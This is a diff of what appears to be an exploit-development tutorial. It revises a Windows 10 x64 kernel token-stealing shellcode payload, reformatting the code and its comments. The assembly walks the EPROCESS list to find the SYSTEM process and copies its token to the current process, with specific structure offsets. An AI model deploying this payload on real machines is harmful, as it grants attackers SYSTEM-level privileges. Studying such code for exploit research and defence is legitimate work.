@@ -17,21 +17,21 @@ The following is the updated token stealing payload that works on Windows 10 200
 
 [BITS 64]
 
-_start:
+__start:
 	xor rax, rax
-    mov rax, [gs:0x188]		  ; Current thread (_KTHREAD)
-	mov rax, [rax + 0xb8]	  ; Current process (_EPROCESS)
-	mov r8, rax			      ; Copy current process (_EPROCESS) to r8
+	mov rax, [gs:0x188]	; Current thread -> _KTHREAD
+	mov rax, [rax + 0xb8]	; Current process -> _EPROCESS
+	mov r8, rax		; Move current process' _EPROCESS to r8
 
 __loop:
-	mov rax, [rax + 0x448] 	  ; ActiveProcessLinks
-	sub rax, 0x448		   	  ; Go back to current process (_EPROCESS)
-	mov rcx, [rax + 0x440] 	  ; UniqueProcessId (PID)
-	cmp rcx, 4 			      ; Compare PID to SYSTEM PID (0x4)
-	jnz __loop			      ; Loop until SYSTEM PID is found
+	mov rax, [rax + 0x448]	; ActiveProcessLinks
+	sub rax, 0x448		; Return to current process -> _EPROCESS
+	mov rcx, [rax + 0x440]	; UniqueProcessId (PID)
+	cmp rcx, 4		; Compare PID to SYSTEM process PID (0x4)
+	jnz __loop		; Iterate over EPROCESS nodes until SYSTEM PID is located
 
-	mov r9, [rax + 0x4b8]	  ; SYSTEM token is @ offset _EPROCESS + 0x4b8
-	mov [r8 + 0x4b8], r9	  ; Copy SYSTEM token to current process
+	mov r9, [rax + 0x4b8]	; _EPROCESS + 0x4b8 -> token
+	mov [r8 + 0x4b8], r9	; Copy SYSTEM token to current process
 ```
 
 For those who are unfamiliar with how the above payload works to grant system-level privilges, lets walk through the assembly a bit while explaining about the EPROCESS structure.
